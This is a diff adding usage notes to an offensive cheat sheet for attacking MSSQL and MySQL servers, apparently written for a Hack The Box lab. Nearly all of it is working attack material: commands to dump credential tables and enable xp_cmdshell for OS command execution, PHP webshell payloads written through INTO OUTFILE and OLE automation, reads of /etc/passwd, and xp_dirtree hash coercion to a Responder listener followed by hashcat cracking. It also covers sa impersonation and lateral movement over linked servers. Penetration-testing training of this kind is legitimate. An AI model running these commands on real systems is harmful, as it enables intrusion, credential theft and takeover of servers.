@@ -30,6 +30,7 @@ If we compromise SQL access, the objective is not only data theft, but also priv
 ```bash
 nmap -Pn -sV -sC -p1433,3306 10.10.10.125
 ```
+> `-Pn` skips ping (useful when ICMP is blocked), `-sV` detects versions, `-sC` runs default scripts. Scans both MSSQL (1433) and MySQL (3306) in one command. Replace the IP.
 
 What to extract immediately:
 
@@ -76,30 +77,35 @@ Misconfiguration in auth mode selection or account policy is often the real atta
 ```bash
 mysql -u julio -pPassword123 -h 10.129.20.13
 ```
+> No space between `-p` and the password. `-u` is the username, `-h` is the remote host. Replace all three with your target's values.
 
 ### MSSQL with sqlcmd (Windows)
 
 ```powershell
 sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 ```
+> `-S` is the server name or IP, `-U` is the SQL login, `-P` is the password. `-y 30 -Y 30` sets column width for readable output. Replace the server, username, and password.
 
 ### MSSQL from Linux with sqsh
 
 ```bash
 sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
 ```
+> `-h` suppresses column headers. End each SQL statement with `go` to execute. Replace the IP, username, and password.
 
 ### MSSQL with Impacket
 
 ```bash
 mssqlclient.py -p 1433 julio@10.129.203.7
 ```
+> Impacket's interactive MSSQL client. Format is `user@IP`. `-p` specifies the port if non-standard. You'll be prompted for the password.
 
 ### MSSQL Windows Auth from Linux (sqsh)
 
 ```bash
 sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
 ```
+> The `.\\` prefix means local Windows authentication (not SQL auth). Use this when the account is a Windows local user, not a SQL login. Double backslash escapes the shell.
 
 Use host/domain prefixes when you want Windows auth instead of SQL-auth local users.
 
@@ -138,6 +144,7 @@ SHOW DATABASES;
 SELECT name FROM master.dbo.sysdatabases;
 GO
 ```
+> Run this immediately after connecting to map the attack surface. Note any non-default databases — they likely hold business data, credentials, or application secrets.
 
 ### Select Database
 
@@ -149,6 +156,7 @@ USE htbusers;
 USE htbusers;
 GO
 ```
+> Switch context to the target database before running table queries. Replace `htbusers` with the database name from the previous step.
 
 ### Show Tables
 
@@ -160,6 +168,7 @@ SHOW TABLES;
 SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES;
 GO
 ```
+> Lists all tables in the current database. Look for `users`, `accounts`, `admins`, `tokens`, and `connections` — those are the most likely to contain credentials.
 
 ### Dump Sensitive Table
 
@@ -171,6 +180,7 @@ SELECT * FROM users;
 SELECT * FROM users;
 GO
 ```
+> Dumps all rows and columns from the target table. Replace `users` with the table name found above. Look for password hashes, API keys, or plaintext passwords.
 
 Focus table triage on likely high-value names:
 
@@ -188,6 +198,7 @@ Focus table triage on likely high-value names:
 xp_cmdshell 'whoami';
 GO
 ```
+> Try this first — if it returns output, xp_cmdshell is already enabled and you have OS command execution. Replace `whoami` with any OS command.
 
 ### Enable xp_cmdshell (if privileged)
 
@@ -201,6 +212,7 @@ GO
 RECONFIGURE;
 GO
 ```
+> Run each statement separately, ending with `go`. First enable advanced options, then enable xp_cmdshell, and reconfigure after each. Requires sysadmin or elevated privileges.
 
 Important behavior:
 
@@ -218,12 +230,14 @@ Important behavior:
 SELECT "<?php echo shell_exec($_GET['c']);?>"
 INTO OUTFILE '/var/www/html/webshell.php';
 ```
+> `INTO OUTFILE` writes the SELECT result to a file on the server. Replace the path with the webroot directory. Requires the FILE privilege and `secure_file_priv` must allow writes to that path.
 
 ### Check `secure_file_priv`
 
 ```sql
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
+> Shows whether MySQL restricts file read/write to a specific directory. An empty value means unrestricted. `NULL` means file operations are disabled entirely.
 
 Interpretation:
 
@@ -245,6 +259,7 @@ GO
 RECONFIGURE;
 GO
 ```
+> Requires sysadmin. Enables OLE Automation, which lets MSSQL call Windows scripting objects. Run each block and `go` before the next.
 
 Create file:
 
@@ -258,6 +273,7 @@ EXECUTE sp_OADestroy @FileID;
 EXECUTE sp_OADestroy @OLE;
 GO
 ```
+> Writes a PHP webshell to the IIS webroot. Replace the destination path (`c:\inetpub\wwwroot\`) with the actual web server root and adjust the shell content as needed.
 
 ---
 
@@ -270,12 +286,14 @@ SELECT *
 FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
 GO
 ```
+> `OPENROWSET(BULK ...)` reads a file as a single text blob. Replace the path with any file you want to read. Requires `ADMINISTER BULK OPERATIONS` or sysadmin.
 
 ### MySQL File Read
 
 ```sql
 SELECT LOAD_FILE('/etc/passwd');
 ```
+> Reads a local file and returns its contents as a string. Requires the FILE privilege. Replace the path with any file on the server. Returns NULL if the file is inaccessible.
 
 MySQL read success depends on FILE privilege, server config, and filesystem permissions.
 
@@ -294,16 +312,19 @@ GO
 EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\';
 GO
 ```
+> Forces the SQL Server to authenticate to your SMB listener and reveals the NTLMv2 hash of the SQL service account. Replace `10.10.110.17` with your tun0 IP. Start Responder first.
 
 ### Listener Options
 
 ```bash
 sudo responder -I tun0
 ```
+> Captures the incoming NTLMv2 auth from the SQL server. `-I tun0` sets the listening interface. Run this before executing xp_dirtree. The hash saves to `/usr/share/responder/logs/`.
 
 ```bash
 sudo impacket-smbserver share ./ -smb2support
 ```
+> Alternative to Responder for capturing SMB auth. Creates a share named `share` in the current directory. `-smb2support` handles SMBv2 connections. Use when Responder conflicts with other tools.
 
 If outbound SMB is possible, you may capture NTLMv2 from the SQL service identity for crack or relay workflows.
 
@@ -321,6 +342,7 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE';
 GO
 ```
+> Returns any login that your current user has permission to impersonate. If `sa` or another sysadmin appears, you can escalate immediately.
 
 ### Check Current Role
 
@@ -329,6 +351,7 @@ SELECT SYSTEM_USER;
 SELECT IS_SRVROLEMEMBER('sysadmin');
 GO
 ```
+> `SYSTEM_USER` shows your current login name. `IS_SRVROLEMEMBER('sysadmin')` returns 1 if you're a sysadmin, 0 if not. Run this before and after impersonation to confirm the privilege change.
 
 ### Impersonate High-Privilege Login
 
@@ -340,6 +363,7 @@ SELECT SYSTEM_USER;
 SELECT IS_SRVROLEMEMBER('sysadmin');
 GO
 ```
+> `EXECUTE AS LOGIN` switches your session context to the named login. Replace `sa` with any login returned by the impersonation query. Verify with `IS_SRVROLEMEMBER` that you now have sysadmin.
 
 Revert context:
 
@@ -347,6 +371,7 @@ Revert context:
 REVERT;
 GO
 ```
+> Returns your session to the original login context. Always revert when you no longer need the elevated session.
 
 ---
 
@@ -358,6 +383,7 @@ GO
 SELECT srvname, isremote FROM sysservers;
 GO
 ```
+> Lists all linked servers. `isremote = 1` means it's a remote linked server. Each one is a potential lateral movement target.
 
 ### Execute Pass-through Query
 
@@ -366,6 +392,7 @@ EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmi
 AT [10.0.0.12\\SQLEXPRESS];
 GO
 ```
+> `AT [server]` runs the query on the linked server. Replace `10.0.0.12\\SQLEXPRESS` with the linked server name from `sysservers`. Check `is_srvrolemember('sysadmin')` — if it returns 1, you have immediate sysadmin on that box.
 
 If linked credentials are privileged, this becomes direct lateral movement into another SQL host.
 
@@ -430,6 +457,7 @@ impacket-mssqlclient htbdbuser:'MSSQLAccess01!'@10.129.203.12 -windows-auth
 # Drop -windows-auth for SQL auth users; this lab uses SQL auth.
 impacket-mssqlclient htbdbuser:'MSSQLAccess01!'@10.129.203.12
 ```
+> Use `-windows-auth` for Windows/domain accounts. Omit it for SQL-local logins. Format is `user:'pass'@IP`. Replace the credentials and IP with your target's values.
 
 Inside the MSSQL shell:
 
@@ -457,6 +485,7 @@ sudo ss -tlnp | grep :445
 sudo kill <PID>          # kill conflicting service
 sudo responder -I tun0 -wv
 ```
+> `ss -tlnp` shows listening TCP ports with PIDs. Kill anything on 445 before starting Responder or it won't bind. `-w` enables WPAD (Web Proxy Auto-Discovery) capture, `-v` is verbose.
 
 In MSSQL session (any low-priv user can run this):
 
@@ -464,6 +493,7 @@ In MSSQL session (any low-priv user can run this):
 EXEC master..xp_dirtree '\\10.10.17.176\share\', 1, 1;
 -- xp_subdirs is an alternate primitive: EXEC master..xp_subdirs '\\10.10.17.176\share\';
 ```
+> Replace `10.10.17.176` with your tun0 IP. The SQL Server reaches out over SMB to your listener and sends the service account's NTLMv2 hash automatically. No sysadmin required.
 
 Responder captures NTLMv2:
 
@@ -480,6 +510,7 @@ cat > /tmp/mssqlsvc_ntlmv2.hash <<'EOF'
 MSSQLSVC::WIN-02:...full hash from responder...
 EOF
 ```
+> Copy the full NTLMv2 hash line from Responder's output into this file. The heredoc preserves special characters. Replace the placeholder with the actual hash string.
 
 ### Step 3 — Crack the NTLMv2 Hash
 
@@ -491,6 +522,7 @@ hashcat -m 5600 /tmp/mssqlsvc_ntlmv2.hash /usr/share/wordlists/rockyou.txt --qui
 hashcat -m 5600 /tmp/mssqlsvc_ntlmv2.hash --show
 # MSSQLSVC::WIN-02:...:princess1
 ```
+> `-m 5600` is NTLMv2 mode. `--quiet` suppresses progress output. Try your loot wordlist first before rockyou. `--show` displays the cracked result after the run completes.
 
 Recovered plaintext: **`princess1`**.
 
@@ -499,6 +531,7 @@ Recovered plaintext: **`princess1`**.
 ```bash
 impacket-mssqlclient 'WIN-02/mssqlsvc:princess1@10.129.203.12' -windows-auth
 ```
+> Use `DOMAIN/user:pass@host` format for Windows auth. `-windows-auth` is required for Windows local/domain accounts. Replace `WIN-02`, `mssqlsvc`, the password, and the IP with your target's values.
 
 Critical syntax notes:
 
